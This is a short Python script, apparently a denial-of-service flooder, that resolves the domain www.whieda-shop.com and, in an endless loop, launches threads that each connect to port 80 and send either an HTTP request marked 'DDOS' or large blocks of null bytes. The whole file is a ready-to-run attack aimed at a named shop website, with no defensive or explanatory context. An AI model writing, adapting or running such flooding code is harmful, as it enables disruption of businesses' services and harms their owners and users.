from socket import socket,AF_INET,SOCK_STREAM,gethostbyname
from threading import Thread
from random import choice

TARGET=gethostbyname('www.whieda-shop.com'),80
PACKETS=[
    b'GET / HTTP/1.1\r\nHost: www.whieda-shop.com\r\nContent-Type: */*\r\nContent-Length: 0\r\nContent-Encoding: utf-8\r\nHeaders: DDOS\r\nConnection: keep-alive\r\n\r\n',
    bytes(65505),
    bytes(1024)
]

def x():
    with socket(AF_INET,SOCK_STREAM)as __sock:
        __sock.connect(TARGET)
        __sock.send(choice(PACKETS))
        __sock.close()

while True:Thread(target=x,daemon=False).start()